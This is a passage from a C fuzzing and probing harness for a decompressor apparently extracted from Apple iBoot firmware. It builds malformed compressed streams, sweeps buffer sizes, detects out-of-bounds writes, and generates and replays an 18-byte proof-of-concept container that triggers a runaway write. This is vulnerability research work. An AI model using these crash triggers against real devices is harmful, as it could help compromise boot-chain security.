            if (!rr_.faulted)
              for (size_t k3 = 0; k3 < d_.hi_sz; k3++) if (d_.hi[k3] != 0x5A) { fr_ = 2; break; }
            printf("  B4z shift=%d dcap=%zu faulted=%d ret=%ld fg=%d", shift, dcap2,
                   rr_.faulted, rr_.ret, fr_);
            if (rr_.faulted)
              printf(" addr-vs-dst=%+lld esr=%llx", 
                     (long long)((long long)rr_.f.addr - (long long)d_.payload),
                     (unsigned long long)rr_.f.signo);
            printf("\n");
            rmbuf(&d_); rmbuf(&s_); free(sbx);
          }
        }
      }
      /* fixed block with distance underflow */
      memset(&w, 0, sizeof w); w.b = db; w.cap = sizeof db;
      DW_PUT(w, 1, 1); DW_PUT(w, 1, 2);
      DW_PUT(w, revbits(0x30 + 'A', 8), 8);
      DW_PUT(w, revbits(1, 7), 7);
      DW_PUT(w, revbits(16, 5), 5);
      DW_PUT(w, 300 - 257, 7);
      DW_PUT(w, revbits(0, 7), 7);
      DW_FLUSH(w);
      R_GO(0x205, db, w.nb, 64, 0x20090, &O);
      r_show("B4b fixed D=300 underflow", &O);
      /* dist sym30/31 */
      memset(&w, 0, sizeof w); w.b = db; w.cap = sizeof db;
      DW_PUT(w, 1, 1); DW_PUT(w, 1, 2);
      DW_PUT(w, revbits(0x30 + 'A', 8), 8);
      DW_PUT(w, revbits(1, 7), 7);
      DW_PUT(w, revbits(30, 5), 5);
      DW_PUT(w, 0, 13);
      DW_PUT(w, revbits(0, 7), 7);
      DW_FLUSH(w);
      R_GO(0x205, db, w.nb, 64, 0x20090, &O);
      r_show("B4c fixed dist-sym30", &O);
      /* real dynamic stream mutations on 0x205 */
      u8 pt[9000]; for (size_t i = 0; i < sizeof pt; i++) pt[i] = (u8)((i * 13) ^ (i >> 5));
      u8 zc[9600];
      size_t zn = compression_encode_buffer(zc, sizeof zc, pt, sizeof pt, NULL, COMPRESSION_ZLIB);
      int dyn = (zc[2] & 7) == 5;
      printf("  [B4] raw-deflate dynamic=%d len=%zu\n", dyn, zn);
      for (int mut = 0; mut < 3; mut++) {
        u8 m[4000]; size_t mn2 = zn > sizeof m ? sizeof m : zn;
        memcpy(m, zc, mn2);
        if (mut == 1) { m[2] = 0xFD; m[3] = 0xFF; m[4] = 0xFF; }
        if (mut == 2) { for (size_t k = 5; k < 28; k++) m[k] ^= 0xA5; }
        R_GO(0x205, m, mn2, 16384, 0x20090, &O);
        char tg[32]; snprintf(tg, sizeof tg, "B4d%d dyn-mut", mut);
        r_show(tg, &O);
      }
      /* truncations + dstcap sweeps on the REAL path */
      for (size_t cut = 2; cut <= 64; cut <<= 1) {
        R_GO(0x205, zc, zn - cut, 16384, 0x20090, &O);
        if (O.faulted || O.fgn) { char tg[32]; snprintf(tg, sizeof tg, "B4e trunc-%zu", cut); r_show(tg, &O); }
      }
      printf("  B4e truncation sweep done (only fault/foreign shown)\n");
      for (size_t dc = 1; dc <= 9000; dc = dc * 2 + 1) {
        R_GO(0x205, zc, zn, dc, 0x20090, &O);
        if (O.faulted || O.fgn) { char tg[32]; snprintf(tg, sizeof tg, "B4f dcap%zu", dc); r_show(tg, &O); }
      }
      printf("  B4f dstcap sweep done (only fault/foreign shown)\n");
      /* 0x505 with PROPER zlib wrapper: CMF/FLG=78 01 + adler32 */
      u8 *zw = malloc(zn + 6);
      zw[0] = 0x78; zw[1] = 0x01;
      memcpy(zw + 2, zc, zn);
      u32 A = 1, B = 0;
      for (size_t i = 0; i < sizeof pt; i++) { A = (A + pt[i]) % 65521; B = (B + A) % 65521; }
      u32 adler = (B << 16) | A;
      wr32(zw + 2 + zn, ((adler & 0xFF) << 24) | ((adler & 0xFF00) << 8) |
                        ((adler >> 8) & 0xFF00) | ((adler >> 24) & 0xFF));
      R_GO(0x505, zw, zn + 6, sizeof pt + 128, 0x20090, &O);
      int ok505 = !O.faulted && O.prod == sizeof pt && !memcmp(O.head, pt, O.headn < sizeof pt ? O.headn : sizeof pt);
      r_show("B4h 0x505 proper zlib wrap", &O);
      printf("     model-match=%d\n", ok505 ? 1 : 0);
      free(zw);
    }

    /* B5: 0x600 hostile */
    {
      u8 gt[4096];
      /* distance-underflow group: first group uses distance flag with empty history */
      wr32(gt + 0, 0x01000101);   /* litmask bits 0,8? -> try: high half bit0 set = new dist word */
      wr16(gt + 4, 0x1234);       /* distance word */
      for (int i = 0; i < 8; i++) gt[6 + i] = 0xB0 + i;
      R_GO(0x600, gt, 14, 64, 64, &O);
      r_show("B5a 0x600 dist-underflow grp", &O);
      /* many groups exceeding dstcap */
      size_t p = 0;
      for (int g = 0; g < 40 && p < sizeof gt - 13; g++) {
        wr32(gt + p, 0x000000FF); p += 4;
        for (int k = 0; k < 8; k++) gt[p++] = (u8)g;
      }
      R_GO(0x600, gt, p, 64, 64, &O);
      r_show("B5b 0x600 40grps dst64", &O);
      /* FFFF-run with len > src remaining */
      gt[0]=gt[1]=0xFF; wr16(gt + 2, 4000); gt[4] = 0;
      memset(gt + 5, 0x77, 100);
      R_GO(0x600, gt, 105, 4096, 64, &O);
      r_show("B5c 0x600 FFFF-run len4000", &O);
      /* truncation fuzz */
      unsigned seed = 0x9999; int bad = 0;
      for (int it = 0; it < 300; it++) {
        seed = seed * 1103515245 + 12345;
        size_t sn = 5 + (seed >> 16) % 120;
        for (size_t i = 0; i < sn; i++) { seed = seed * 1103515245 + 12345; gt[i] = (u8)(seed >> 16); }
        R_GO(0x600, gt, sn, 512, 64, &O);
        if (O.faulted || O.fgn) { char tg[48]; snprintf(tg, sizeof tg, "B5d fz%d sn=%zu", it, sn);
                                  r_show(tg, &O); bad++; if (bad > 6) break; }
      }
      printf("  B5d 0x600 fuzz x300: anomalies=%d\n", bad);
    }

    /* B6: ZBM hostile */
    {
      u8 zb[4200];
      /* gate-passing frames with random bodies */
      unsigned seed = 0x7777; int bad = 0, fired = 0;
      for (int it = 0; it < 400; it++) {
        seed = seed * 1103515245 + 12345;
        u32 win = (it & 1) ? 0x8000 : 0x4000;
        zb[0]='Z'; zb[1]='B'; zb[2]='M'; zb[3] = (u8)(0x08 | (win == 0x8000 ? 1 : 0));
        u32 lenB = (seed >> 16) % 0x400 + 0x21;
        u32 lenA = lenB + 6 + ((seed >> 8) % 3 ? 0 : 1);  /* mostly ==, sometimes -1 edge */
        if (lenA < 0x21) lenA = 0x21;
        zb[4]=(u8)lenA; zb[5]=(u8)(lenA>>8); zb[6]=(u8)(lenA>>16);
        zb[7]=(u8)lenB; zb[8]=(u8)(lenB>>8); zb[9]=(u8)(lenB>>16);
        size_t body = lenA - 6;
        for (size_t i = 0; i < body; i++) { seed = seed * 1103515245 + 12345; zb[10 + i] = (u8)(seed >> 16); }
        R_GO(0x700, zb, 10 + body, 8192, 0x2080, &O);
        if (O.ret > 0) fired++;
        if (O.faulted || O.fgn) { char tg[48]; snprintf(tg, sizeof tg, "B6 fz%d lenB=%u", it, lenB);
                                  r_show(tg, &O); bad++; if (bad > 6) break; }
      }
      printf("  B6 0x700 gate-passing fuzz x400: decoded>0=%d anomalies=%d\n", fired, bad);
      /* len edges */
      struct { u32 lenB, lenA; const char *tag; } eds[] = {
        { 0x4000, 0x4000 + 6, "lenB=win0x4000" },
        { 0x8000, 0x8000 + 6, "lenB=win0x8000(flags9)" },
        { 0x8000, 0x8000 + 7, "lenA=lenB+7(reject)" },
        { 0x100,  0x20,       "lenA=0x20(minus)" },
        { 0xFFFFFFFF, 0x25,   "lenB=huge" },
      };
      for (unsigned e = 0; e < 5; e++) {
        zb[0]='Z'; zb[1]='B'; zb[2]='M'; zb[3] = (eds[e].lenB > 0x4000) ? 0x09 : 0x08;
        zb[4]=(u8)eds[e].lenA; zb[5]=(u8)(eds[e].lenA>>8); zb[6]=(u8)(eds[e].lenA>>16);
        zb[7]=(u8)eds[e].lenB; zb[8]=(u8)(eds[e].lenB>>8); zb[9]=(u8)(eds[e].lenB>>16);
        memset(zb + 10, 0x33, 3000);
        size_t sn = eds[e].lenA < 3000 ? 10 + eds[e].lenA - 6 : 3010;
        R_GO(0x700, zb, sn, 16384, 0x2080, &O);
        char tg[48]; snprintf(tg, sizeof tg, "B6e %s", eds[e].tag);
        r_show(tg, &O);
      }
    }

    /* B7: 0x900 hostile */
    {
      u8 lt[64];
      /* literal run longer than dst */
      memset(lt, 0xCC, sizeof lt); lt[0] = 0xEF; for (int i = 0; i < 15; i++) lt[1 + i] = 0x41;
      R_GO(0x900, lt, sizeof lt, 8, 64, &O);
      r_show("B7a 0x900 lit15 dst8", &O);
      /* repeat-match token FIRST (stale D=0) */
      lt[0] = 0xF5; lt[1] = 0x03;
      R_GO(0x900, lt, sizeof lt, 64, 64, &O);
      r_show("B7b 0x900 F5-first(staleD)", &O);
      /* default-family with D > produced (underflow) using discovered Q if any */
      u8 t2[24]; memset(t2, 0xCC, sizeof t2);
      t2[0] = 0xE3; t2[1]='A'; t2[2]='B'; t2[3]='C';
      t2[4] = 0x00; wr32(t2 + 5, 0xFFFFFu << 6);  /* max D11 */
      t2[13] = 0x06;
      R_GO(0x900, t2, 14, 64, 64, &O);
      r_show("B7c 0x900 D=max underflow?", &O);
      /* A-family 14-bit dist */
      u32 q2 = 0xA5;                              /* op 0xa5: D14=(q>>10)&0x3fff etc from qword */
      memset(t2, 0xCC, sizeof t2); t2[0] = (u8)q2;
      wr64(t2 + 1, 0);
      R_GO(0x900, t2, 16, 64, 64, &O);
      r_show("B7d 0x900 A-family op", &O);
      /* truncations */
      u8 full[64]; memset(full, 0xCC, sizeof full);
      full[0]=0xE5; memcpy(full+1,"Hello",5); full[6]=0x00; wr32(full+7, 0x0000C003); full[11]=0x06;
      for (size_t sn = 1; sn <= 11; sn++) {
        R_GO(0x900, full, sn, 64, 64, &O);
        if (O.faulted || O.fgn) { char tg[32]; snprintf(tg, sizeof tg, "B7e trunc%zu", sn); r_show(tg, &O); }
      }
      printf("  B7e truncation sweep done (only fault/foreign shown)\n");
      /* fuzz */
      unsigned seed = 0xABCD; int bad = 0;
      for (int it = 0; it < 400; it++) {
        seed = seed * 1103515245 + 12345;
        size_t sn = 8 + (seed >> 16) % 56;
        for (size_t i = 0; i < sn; i++) { seed = seed * 1103515245 + 12345; full[i] = (u8)(seed >> 16); }
        R_GO(0x900, full, sn, 256, 64, &O);
        if (O.faulted || O.fgn) { char tg[48]; snprintf(tg, sizeof tg, "B7f fz%d sn=%zu", it, sn);
                                  r_show(tg, &O); bad++; if (bad > 6) break; }
      }
      printf("  B7f 0x900 fuzz x400: anomalies=%d\n", bad);
    }

    /* B8: 0x100 container hostiles */
    if (lzvn_pay) {
      u8 cb[64];
      /* bv4- raw with out_len = 0xFFFFFFFF vs small dst */
      wr32(cb + 0, 0x2d347662); wr32(cb + 4, 0xFFFFFFFF);
      memset(cb + 8, 0x66, 40);
      R_GO(0x100, cb, 48, 32, 64, &O);
      r_show("B8a 0x100 raw outlen=FFFFFFFF", &O);
      /* bv41 declared-out lie */
      size_t cn = 12 + lzvn_n + 4;
      u8 *ct = malloc(cn);
      wr32(ct, 0x31347662); wr32(ct + 4, 0xFFFFFFF0); wr32(ct + 8, (u32)lzvn_n);
      memcpy(ct + 12, lzvn_pay, lzvn_n); wr32(ct + 12 + lzvn_n, 0x24347662);
      R_GO(0x100, ct, cn, lzvn_out + 64, 64, &O);
      r_show("B8b 0x100 bv41 outlie", &O);
      free(ct);
      /* payload_len lie short */
      ct = malloc(12 + 8 + 4);
      wr32(ct, 0x31347662); wr32(ct + 4, 4096); wr32(ct + 8, (u32)lzvn_n - 4);
      memcpy(ct + 12, lzvn_pay, lzvn_n - 4); wr32(ct + 12 + lzvn_n - 4, 0x24347662);
      R_GO(0x100, ct, 12 + lzvn_n, lzvn_out + 64, 64, &O);
      r_show("B8c 0x100 bv41 paylie-short", &O);
      free(ct);
    }

    printf("== R1 done ==\n");
    return 0;
  }

  /* =================== MODE b0c: isolate LZVN slow-core truncation cell =================== */
  if (!strcmp(mode, "b0c")) {
    static const struct { const char *tag; u8 b[8]; size_t n; } cells[] = {
      { "op0F_A",   { 0x0F, 0x41 }, 2 },
      { "opFF",     { 0xFF, 0x41 }, 2 },
      { "opF1_A",   { 0xF1, 0x41 }, 2 },
      { "op0F_FF_A",{ 0x0F, 0xFF, 0x41 }, 3 },
      { "lit5_only",{ 0x35, 'A', 'B', 'C', 'D', 'E' }, 6 },
    };
    for (unsigned c = 0; c < sizeof(cells)/sizeof(cells[0]); c++) {
      for (size_t dcap = 64; dcap <= 4096; dcap <<= 2) {
        struct buf d_, s_; struct R rr_;
        mkbuf(&d_, dcap); mkbuf(&s_, 64);
        memset(d_.payload, 0x11, dcap);
        GUARDED(g_disp(d_.payload, dcap, cells[c].b, cells[c].n, s_.payload, 0x101), rr_);
        printf("  %-10s n=%zu dcap=%zu ret=%ld faulted=%d", cells[c].tag, cells[c].n, dcap,
               rr_.ret, rr_.faulted);
        if (rr_.faulted)
          printf(" pc=%llx addr=%llx delta_src=%lld",
                 (unsigned long long)(rr_.f.pc - (u64)g_fw),
                 (unsigned long long)rr_.f.addr,
                 (long long)((long long)rr_.f.addr - (long long)cells[c].b));
        printf("\n");
        rmbuf(&d_); rmbuf(&s_);
      }
    }
    return 0;
  }

  /* =================== MODE b0w: 0x101 runaway write-evidence probe =================== */
  if (!strcmp(mode, "b0w")) {
    static const u8 pat[] = { 0x0F, 0x41 };
    for (size_t dcap = 64; dcap <= 4096; dcap <<= 2) {
      struct buf d_, s_; struct R rr_;
      mkbuf(&d_, dcap); mkbuf(&s_, 64);
      memset(d_.payload, 0x11, dcap);
      GUARDED(g_disp(d_.payload, dcap, pat, sizeof pat, s_.payload, 0x101), rr_);
      printf("  b0w dcap=%zu faulted=%d", dcap, rr_.faulted);
      if (rr_.faulted) {
        long first = -1, last = -1;
        for (long k = 0; k < (long)(dcap + 65536); k++)
          if (d_.payload[k] != 0x11) { if (first < 0) first = k; last = k; }
        int hi = 0; for (size_t k2 = 0; k2 < d_.hi_sz; k2++) if (d_.hi[k2] != 0x5A) { hi = 1; break; }
        printf(" sig=%d pc_off=%llx addr-vs-dst=%+lld dirty-span=[%ld..%ld) capSpanOOB=%ld hiApronDirty=%d",
               rr_.f.signo,
               (unsigned long long)(rr_.f.pc - (u64)g_fw),
               (long long)((long long)rr_.f.addr - (long long)d_.payload),
               first, last + 1, (last >= (long)dcap ? last + 1 - (long)dcap : 0), hi);
      }
      printf("\n");
      rmbuf(&d_); rmbuf(&s_);
    }
    /* extra: same poisons through containers */
    {
      struct buf d_, s_; struct R rr_;
      /* 0x100 bv41{poison} */
      for (int v = 0; v < 2; v++) {
        u8 st[64]; size_t sn;
        u32 idv;
        if (v == 0) {   /* bv41 wrap of [0F 41] = THE poc-v0 container */
          st[0]=0x62; st[1]='v'; st[2]='4'; st[3]='1';
          wr32(st+4, 64); wr32(st+8, 2);
          st[12]=0x0F; st[13]=0x41;
          wr32(st+14, 0x24347662);
          sn = 18; idv = 0x100;
          { /* dump the EXACT container bytes fed to the decoder */
            const char *po = getenv("DS_POCOUT");
            const char *pp = po ? po : "/tmp/ds_iboot/poc_v0.bin";
            FILE *pf = fopen(pp, "wb");
            if (!pf) { perror("dump poc_v0"); }
            else { fwrite(st, 1, sn, pf); fclose(pf);
                   printf("  [poc-v0] dumped %zu container bytes -> %s\n", sn, pp); }
            hexdump("  [poc-v0] container (id=0x100 decode input)", st, sn);
          }
        } else {        /* zlib-wrapped stored LEN=FFFF */
          st[0]=0x78; st[1]=0x01;
          st[2]=0x01; st[3]=0xFF; st[4]=0xFF; st[5]=0xFF; st[6]=0xFF;
          memset(st+7, 0x5A, 16);
          sn = 23; idv = 0x505;
        }
        mkbuf(&d_, 4096); mkbuf(&s_, v ? 0x20090 : 64);
        memset(d_.payload, 0x11, 4096);
        GUARDED(g_disp(d_.payload, 4096, st, sn, s_.payload, idv), rr_);
        printf("  poc-v%d id=%#x sn=%zu faulted=%d", v, idv, sn, rr_.faulted);
        if (rr_.faulted) {
          long first = -1, last = -1;
          for (long k = 0; k < (long)(4096 + 65536); k++)
            if (d_.payload[k] != 0x11) { if (first < 0) first = k; last = k; }
          int hi = 0; for (size_t k2 = 0; k2 < d_.hi_sz; k2++) if (d_.hi[k2] != 0x5A) { hi = 1; break; }
          printf(" sig=%d pc_off=%llx addr-vs-dst=%+lld dirty-span=[%ld..%ld) OOBpast4K=%ld hiApronDirty=%d",
                 rr_.f.signo,
                 (unsigned long long)(rr_.f.pc - (u64)g_fw),
                 (long long)((long long)rr_.f.addr - (long long)d_.payload),
                 first, last + 1, (last >= 4096 ? last + 1 - 4096 : 0), hi);
        }
        printf("\n");
        rmbuf(&d_); rmbuf(&s_);
      }
    }
    return 0;
  }

  /* =================== MODE pocv0: decode /tmp/ds_iboot/poc_v0.bin FROM DISK via id 0x100 =====
   * Proves the on-disk PoC artifact reproduces the in-memory b0w poc-v0 result.
   * usage: qsweep pocv0 [path]  (default /tmp/ds_iboot/poc_v0.bin; DS_POCOUT respected) */
  if (!strcmp(mode, "pocv0")) {
    static const char *DEF_POC = "/tmp/ds_iboot/poc_v0.bin";
    const char *pp = argc > 2 ? argv[2] : DEF_POC;
    u8 st[64]; size_t sn;
    {
      FILE *pf = fopen(pp, "rb");
      if (!pf) { fprintf(stderr, "pocv0: cannot open %s\n", pp); return 3; }
      sn = fread(st, 1, sizeof st, pf);
      fclose(pf);
    }
    printf("== POCV0: on-disk bv41{0F 41} container through dispatcher id=0x100 ==\n");
    printf("  [pocv0] loaded %zu bytes from %s\n", sn, pp);
    hexdump("  [pocv0] file bytes (decode input)", st, sn);
    int magic_ok = sn >= 18 && rd32(st+0) == 0x31347662 && rd32(st+14) == 0x24347662
                   && rd32(st+4) == 64 && rd32(st+8) == 2 && st[12] == 0x0F && st[13] == 0x41;
    printf("  [pocv0] field check: magic=bv41 end=bv4$ out=%u paylen=%u payload=%02x %02x -> %s\n",
           rd32(st+4), rd32(st+8), st[12], st[13], magic_ok ? "MATCH" : "MISMATCH");
    struct buf d_, s_; struct R rr_;
    mkbuf(&d_, 4096); mkbuf(&s_, 64);
    memset(d_.payload, 0x11, 4096);
    GUARDED(g_disp(d_.payload, 4096, st, sn, s_.payload, 0x100), rr_);
    printf("  pocv0-from-file id=0x100 sn=%zu faulted=%d", sn, rr_.faulted);
    if (rr_.faulted) {
      long first = -1, last = -1;
      for (long k = 0; k < (long)(4096 + 65536); k++)
        if (d_.payload[k] != 0x11) { if (first < 0) first = k; last = k; }
      int hi = 0; for (size_t k2 = 0; k2 < d_.hi_sz; k2++) if (d_.hi[k2] != 0x5A) { hi = 1; break; }
      printf(" sig=%d pc_off=%llx addr-vs-dst=%+lld dirty-span=[%ld..%ld) OOBpast4K=%ld hiApronDirty=%d",
             rr_.f.signo,
             (unsigned long long)(rr_.f.pc - (u64)g_fw),
             (long long)((long long)rr_.f.addr - (long long)d_.payload),
             first, last + 1, (last >= 4096 ? last + 1 - 4096 : 0), hi);
    }
    printf("\n");
    rmbuf(&d_); rmbuf(&s_);
    return 0;
  }

  /* =================== MODE gen: produce real Apple LZFSE streams =================== */
  if (!strcmp(mode, "gen")) {
    struct { const char *name; size_t n; u8 pat; int period; } specs[] = {
      { "rand200k", 200000, 0, 0 },
      { "same64k",  65536,  'A', 1 },
      { "periodic", 131072, 0, 257 },
      { "tiny",     300,    0, 7 },
    };
    for (unsigned s = 0; s < sizeof(specs)/sizeof(specs[0]); s++) {
      size_t n = specs[s].n;
      u8 *in = malloc(n);
      if (specs[s].period == 0) { srand(s+1); for (size_t i = 0; i < n; i++) in[i] = rand() & 0xFF; }
      else if (specs[s].period == 1) memset(in, specs[s].pat, n);
      else for (size_t i = 0; i < n; i++) in[i] = (u8)((i % specs[s].period) * 3 + 1);
      size_t cap = n + n/4 + 4096;
      u8 *out = malloc(cap);
      size_t r = compression_encode_buffer(out, cap, in, n, NULL, COMPRESSION_LZFSE);
      printf("[gen] %s: in=%zu enc=%zu\n", specs[s].name, n, r);
      char path[256]; snprintf(path, sizeof(path), "/tmp/ds_iboot/harness/%s.lz", specs[s].name);
      FILE *f = fopen(path, "wb"); fwrite(out, 1, r, f); fclose(f);
      free(in); free(out);
    }
    return 0;
  }

  /* =================== MODE val: harness validation V1..V4 =================== */
  if (!strcmp(mode, "val")) {
    printf("== V1: hand-built bvx- uncompressed block through FUN_001E908C ==\n");
    {
      struct buf src, dst; mkbuf(&src, 4096); mkbuf(&dst, 8192);
      memset(dst.payload, 0xCC, dst.cap);
      // NOTE: 64 bytes - the raw copier drops count&3 trailing bytes (Q3a quirk)
      u8 payload[] = "DIRTYSLIDE-iBoot-decompressor-native-harness-validation-block!!!";
      size_t pn = sizeof(payload) - 1;
      wr32(src.payload + 0, 0x2d787662);
      wr32(src.payload + 4, (u32)pn);
      memcpy(src.payload + 8, payload, pn);
      size_t srclen = 8 + pn;
      struct R r; GUARDED(g_direct(dst.payload, dst.cap, src.payload, srclen, src.payload + 2048), r);
      int ok = !r.faulted && memcmp(dst.payload, payload, pn) == 0;
      printf("  direct(bvx-) ret=%ld faulted=%d produced=%zu -> V1 %s\n", r.ret, r.faulted,
             produced_len(dst.payload, 256, 0xCC), ok ? "PASS" : "FAIL");
      if (!ok) { size_t dd_ = first_diff(dst.payload, payload, pn);
                 printf("  diff@%zu: got %02x want %02x\n", dd_, dst.payload[dd_], payload[dd_]);
                 if (r.faulted) printf("  FAULT pc=%llx addr=%llx\n", r.f.pc, r.f.addr); }
      rmbuf(&src); rmbuf(&dst);
      if (!ok) return 1;
    }
    printf("== V2/V3: Apple LZFSE round-trip via FUN_001E908C + dispatcher id=0x891 ==\n");
    {
      size_t n = 70000;
      u8 *in = malloc(n);
      for (size_t i = 0; i < n; i++) in[i] = (u8)((i * 7 + (i >> 9)) & 0xFF);
      size_t cap = n + 4096;
      u8 *enc = malloc(cap);
      size_t enclen = compression_encode_buffer(enc, cap, in, n, NULL, COMPRESSION_LZFSE);
      struct buf dst; mkbuf(&dst, n + 8192);
      struct buf scr; mkbuf(&scr, SCRATCH_SZ);
      struct buf st; mkbuf(&st, 262144);
      memset(dst.payload, 0xCC, dst.cap);
      struct R r; GUARDED(g_direct(dst.payload, dst.cap, enc, enclen, st.payload), r);
      int ok2 = !r.faulted && (size_t)r.ret == n && !memcmp(dst.payload, in, n);
      printf("  direct ret=%ld faulted=%d -> V2 %s\n", r.ret, r.faulted, ok2 ? "PASS" : "FAIL");
      memset(dst.payload, 0xCC, dst.cap);
      GUARDED(g_disp(dst.payload, dst.cap, enc, enclen, scr.payload, 0x891), r);
      int ok3 = !r.faulted && (size_t)r.ret == n && !memcmp(dst.payload, in, n);
      printf("  disp891 ret=%ld faulted=%d -> V3 %s\n", r.ret, r.faulted, ok3 ? "PASS" : "FAIL");
      u8 small_in[5000]; for (int i = 0; i < 5000; i++) small_in[i] = (u8)(i ^ (i>>3));
      u8 small_enc[8192]; size_t sl = compression_encode_buffer(small_enc, sizeof(small_enc), small_in, 5000, NULL, COMPRESSION_LZFSE);
      for (int id = 0x801; id <= 0x802; id++) {
        memset(dst.payload, 0xCC, dst.cap);
        GUARDED(g_disp(dst.payload, dst.cap, small_enc, sl, scr.payload, id), r);
        int okx = !r.faulted && (size_t)r.ret == 5000 && !memcmp(dst.payload, small_in, 5000);
        printf("  smoke id=%#x ret=%ld faulted=%d %s\n", id, r.ret, r.faulted, okx ? "MATCH" : "MISMATCH");
      }
      rmbuf(&dst); rmbuf(&scr); rmbuf(&st);
      if (!(ok2 && ok3)) return 1;
    }
    return 0;
  }

  /* =================== MODE q1: staging family =================== */
  if (!strcmp(mode, "q1")) {
    tb_init();
    printf("== Q1/A: benign synthetic blocks (synthesizer validity) ==\n");
    {
      struct cell c; memset(&c, 0, sizeof(c)); struct cellout o;
      c.id = 0x891; c.nb = 1; c.T[0] = 8; c.L[0] = 4; c.M[0] = 4;
      for (int k = 0; k < 8; k++) c.D[0][k] = (k % 2) ? 5 : 4;
      run_cell(&c, &o, 1);
      printf("  id=%#x T=8 D=4/5: ret=%ld faulted=%d model=%d foreign=%d %s\n", c.id, o.ret, o.r.faulted, o.model_ok, o.foreign, o.note);
      if (o.r.faulted) printf("    FAULT pc=%llx addr=%llx\n", o.r.f.pc, o.r.f.addr);
      c.id = 0x801; run_cell(&c, &o, 1);
      printf("  id=0x801        : ret=%ld faulted=%d model=%d %s\n", o.ret, o.r.faulted, o.model_ok, o.note);
      c.id = 0x802; run_cell(&c, &o, 1);
      printf("  id=0x802        : ret=%ld faulted=%d model=%d %s\n", o.ret, o.r.faulted, o.model_ok, o.note);
      c.id = 0; run_cell(&c, &o, 1);
      printf("  direct          : ret=%ld faulted=%d model=%d %s\n", o.ret, o.r.faulted, o.model_ok, o.note);
      // two-block benign: edge case D == produced+L exactly (source lands ON dst_begin)
      memset(&c, 0, sizeof(c)); c.id = 0x891; c.nb = 2;
      c.T[0]=1; c.L[0]=4;  c.M[0]=4; c.D[0][0]=4;
      c.T[1]=1; c.L[1]=15; c.M[1]=8; c.D[1][0]=23;   // guard edge: 8+15=23
      run_cell(&c, &o, 1);
      printf("  id=0x891 2-block edge D=23: ret=%ld faulted=%d model=%d foreign=%d %s\n", o.ret, o.r.faulted, o.model_ok, o.foreign, o.note);
      c.id = 0; run_cell(&c, &o, 1);
      printf("  direct    2-block edge D=23: ret=%ld faulted=%d foreign=%d %s\n", o.ret, o.r.faulted, o.foreign, o.note);
      if (o.r.faulted) printf("    FAULT pc=%llx addr=%llx\n", o.r.f.pc, o.r.f.addr);
    }
    printf("== Q1/B: hostile-D sweep via 2 blocks (block1 pads to P=32; L2=15 => guard edge D=47) ==\n");
    {
      const u32 Ds[] = { 30, 44, 45, 46, 47, 48, 49, 50, 63, 100, 1000, 16383, 262139 };
      for (unsigned di = 0; di < sizeof(Ds)/sizeof(Ds[0]); di++) {
        struct cell c; memset(&c, 0, sizeof(c)); struct cellout o;
        c.id = 0x891; c.nb = 2;
        c.T[0]=1; c.L[0]=4;  c.M[0]=4; c.D[0][0]=4;
        c.T[1]=1; c.L[1]=15; c.M[1]=8; c.D[1][0]=Ds[di];
        run_cell(&c, &o, 1);
        printf("  0x891 D=%6u: ret=%ld faulted=%d model=%d foreign=%d %s",
               Ds[di], o.ret, o.r.faulted, o.model_ok, o.foreign, o.note);
        if (o.r.faulted) printf(" FAULT pc=%llx addr=%llx sig=%d", o.r.f.pc, o.r.f.addr, o.r.f.signo);
        printf("\n");
      }
    }
    printf("== Q1/C: other staging ids on the edge/past-guard cases ==\n");
    {
      int ids[3] = { 0x801, 0x802, 0 }; u32 dss[2] = { 47, 48 };
      for (int ii = 0; ii < 3; ii++) for (int kk = 0; kk < 2; kk++) {
        struct cell c; memset(&c, 0, sizeof(c)); struct cellout o;
        c.id = ids[ii]; c.nb = 2;
        c.T[0]=1; c.L[0]=4;  c.M[0]=4; c.D[0][0]=4;
        c.T[1]=1; c.L[1]=15; c.M[1]=8; c.D[1][0]=dss[kk];
        run_cell(&c, &o, ids[ii] ? 1 : 0);
        printf("  id=%#x D=%u: ret=%ld faulted=%d foreign=%d %s", ids[ii], dss[kk], o.ret, o.r.faulted, o.foreign, o.note);
        if (o.r.faulted) printf(" FAULT pc=%llx addr=%llx", o.r.f.pc, o.r.f.addr);
        printf("\n");
      }
    }
    return 0;
  }

  /* =================== MODE dbg7: staging rejection bisect =================== */
  if (!strcmp(mode, "dbg7")) {
    tb_init();
    harvest_real_header();
    FILE *f = fopen("/tmp/ds_iboot/harness/same64k.lz", "rb");
    fseek(f, 0, SEEK_END); long sz = ftell(f); fseek(f, 0, SEEK_SET);
    u8 *d = malloc(sz); fread(d, 1, sz, f); fclose(f);
    long hs = (long)(rd32(d+0x18) & 0xffffffffU);
    struct buf dst, scr;
    mkbuf(&dst, 200000); mkbuf(&scr, SCRATCH_SZ);
    u8 *rep = malloc(sz + 0x800);
    #define TRY7(tag) do { \
      memcpy(rep, g_HREAL, HDR_SZ); memcpy(rep + HDR_SZ, d + hs, sz - hs); \
      memset(dst.payload, 0x11, dst.cap); \
      struct R r_; GUARDED(g_disp(dst.payload, dst.cap, rep, HDR_SZ + sz - hs, scr.payload, 0x891), r_); \
      printf("  %-38s ret=%ld faulted=%d\n", tag, r_.ret, r_.faulted); \
    } while (0)
    memcpy(g_HREAL, g_HREAL, HDR_SZ);
    TRY7("pristine real hdr");
    { u8 save[HDR_SZ]; memcpy(save, g_HREAL, HDR_SZ);
      memset(g_HREAL + 0x20, 0, 0x10); TRY7("lit states -> 0");
      wr16(g_HREAL+0x2C,0); wr16(g_HREAL+0x2E,0); TRY7("+ m/lr inits -> 0");
      wr16(g_HREAL+0x30,0); TRY7("+ dist init -> 0");
      memcpy(g_HREAL, save, HDR_SZ); }
    { u8 save[HDR_SZ]; memcpy(save, g_HREAL, HDR_SZ);
      for (int i=0;i<20;i++) wr16(g_HREAL+0x32+2*i, i==14?64:0);
      for (int i=0;i<20;i++) wr16(g_HREAL+0x5A+2*i, i==3?64:0);
      for (int i=0;i<64;i++) wr16(g_HREAL+0x82+2*i, i==11?256:0);
      for (int i=0;i<256;i++) wr16(g_HREAL+0x102+2*i, i==0x41?1024:0);
      TRY7("freqs -> stationary single-sym");
      memcpy(g_HREAL, save, HDR_SZ); }
    { u8 save[HDR_SZ]; memcpy(save, g_HREAL, HDR_SZ);
      wr32(g_HREAL+0x0C, 32); TRY7("n_literals -> 32");
      memcpy(g_HREAL, save, HDR_SZ); }
    { u8 save[HDR_SZ]; memcpy(save, g_HREAL, HDR_SZ);
      wr32(g_HREAL+0x1C, 0); TRY7("sel_lit -> 0");
      memcpy(g_HREAL, save, HDR_SZ); }
    rmbuf(&dst); rmbuf(&scr); free(d); free(rep);
    return 0;
  }

